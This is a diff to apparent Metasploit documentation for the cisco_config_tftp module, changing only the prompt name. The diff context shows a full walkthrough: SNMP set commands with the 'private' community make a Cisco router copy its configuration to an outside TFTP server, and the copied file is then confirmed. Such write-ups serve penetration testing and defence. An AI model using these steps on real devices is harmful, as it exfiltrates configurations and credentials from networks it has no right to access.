@@ -26,12 +26,12 @@
 ### Cisco UC520-8U-4FXO-K9 running IOS 12.4
 
 ```
-msf5 > setg rhosts 2.2.2.2
+msf > setg rhosts 2.2.2.2
 rhosts => 2.2.2.2
-msf5 > use auxiliary/scanner/snmp/cisco_config_tftp
-msf5 auxiliary(scanner/snmp/cisco_config_tftp) > set community private
+msf > use auxiliary/scanner/snmp/cisco_config_tftp
+msf auxiliary(scanner/snmp/cisco_config_tftp) > set community private
 community => private
-msf5 auxiliary(scanner/snmp/cisco_config_tftp) > run
+msf auxiliary(scanner/snmp/cisco_config_tftp) > run
 
 [*] Starting TFTP server...
 [*] Scanning for vulnerable targets...
@@ -55,10 +55,10 @@ was utilized to create this process.
 1. Start the TFTP server
 
 ```
-msf5 > use auxiliary/server/tftp 
-msf5 auxiliary(server/tftp) > run
+msf > use auxiliary/server/tftp 
+msf auxiliary(server/tftp) > run
 [*] Auxiliary module running as background job 0.
-msf5 auxiliary(server/tftp) > 
+msf auxiliary(server/tftp) > 
 [*] Starting TFTP server on 0.0.0.0:69...
 [*] Files will be served from /tmp
 [*] Uploaded files will be saved in /tmp
@@ -67,27 +67,27 @@ msf5 auxiliary(server/tftp) >
 2. Execute the SNMP commands.  An integer is required to group the requests together, `666` is used in this example.
 
 ```
-msf5 auxiliary(server/tftp) > snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.2.666 i 1 
+msf auxiliary(server/tftp) > snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.2.666 i 1 
 [*] exec: snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.2.666 i 1 
 
 iso.3.6.1.4.1.9.9.96.1.1.1.1.2.666 = INTEGER: 1
-msf5 auxiliary(server/tftp) > snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.3.666 i 4 
+msf auxiliary(server/tftp) > snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.3.666 i 4 
 [*] exec: snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.3.666 i 4 
 
 iso.3.6.1.4.1.9.9.96.1.1.1.1.3.666 = INTEGER: 4
-msf5 auxiliary(server/tftp) > snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.4.666 i 1 
+msf auxiliary(server/tftp) > snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.4.666 i 1 
 [*] exec: snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.4.666 i 1 
 
 iso.3.6.1.4.1.9.9.96.1.1.1.1.4.666 = INTEGER: 1
-msf5 auxiliary(server/tftp) > snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.5.666 a "1.1.1.1" 
+msf auxiliary(server/tftp) > snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.5.666 a "1.1.1.1" 
 [*] exec: snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.5.666 a "1.1.1.1" 
 
 iso.3.6.1.4.1.9.9.96.1.1.1.1.5.666 = IpAddress: 1.1.1.1
-msf5 auxiliary(server/tftp) > snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.6.666 s "backup_config" 
+msf auxiliary(server/tftp) > snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.6.666 s "backup_config" 
 [*] exec: snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.6.666 s "backup_config" 
 
 iso.3.6.1.4.1.9.9.96.1.1.1.1.6.666 = STRING: "backup_config"
-msf5 auxiliary(server/tftp) > snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.14.666 i 1 
+msf auxiliary(server/tftp) > snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.14.666 i 1 
 [*] exec: snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.14.666 i 1 
 
 iso.3.6.1.4.1.9.9.96.1.1.1.1.14.666 = INTEGER: 1
@@ -96,7 +96,7 @@ iso.3.6.1.4.1.9.9.96.1.1.1.1.14.666 = INTEGER: 1
 3. At this point the config is transferring, we need to wait a few seconds.  Lastly, we'll remove `666` from the system.
 
 ```
-msf5 auxiliary(server/tftp) > snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.14.666 i 6
+msf auxiliary(server/tftp) > snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.14.666 i 6
 [*] exec: snmpset -v 1 -c private 2.2.2.2 .1.3.6.1.4.1.9.9.96.1.1.1.1.14.666 i 6
 
 iso.3.6.1.4.1.9.9.96.1.1.1.1.14.666 = INTEGER: 6
@@ -105,7 +105,7 @@ iso.3.6.1.4.1.9.9.96.1.1.1.1.14.666 = INTEGER: 6
 4. Confirm we have our config file
 
 ```
-msf5 auxiliary(server/tftp) > ls -lah /tmp/backup_config
+msf auxiliary(server/tftp) > ls -lah /tmp/backup_config
 [*] exec: ls -lah /tmp/backup_config
 
 -rw-r--r-- 1 root root 23K Oct 11 22:20 /tmp/backup_config
